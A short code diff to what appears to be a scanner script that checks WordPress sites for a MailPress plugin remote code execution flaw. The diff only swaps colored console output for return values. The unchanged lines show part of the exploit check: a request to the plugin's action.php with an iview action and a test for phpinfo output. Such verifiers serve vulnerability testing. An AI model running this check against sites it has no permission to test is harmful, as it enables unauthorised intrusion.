@@ -10,8 +10,8 @@ import re
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class wordpress_plugin_mailpress_rce_BaseVerify:
     def __init__(self, url):
@@ -48,12 +48,12 @@ class wordpress_plugin_mailpress_rce_BaseVerify:
             shellurl = self.url + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id="+searchid
             req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req2.text:
-                cprint("[+]存在wordpress 插件mailpress远程代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl, "red")
+                return "[+]存在wordpress 插件mailpress远程代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = wordpress_plugin_mailpress_rce_BaseVerify(sys.argv[1])
     testVuln.run()
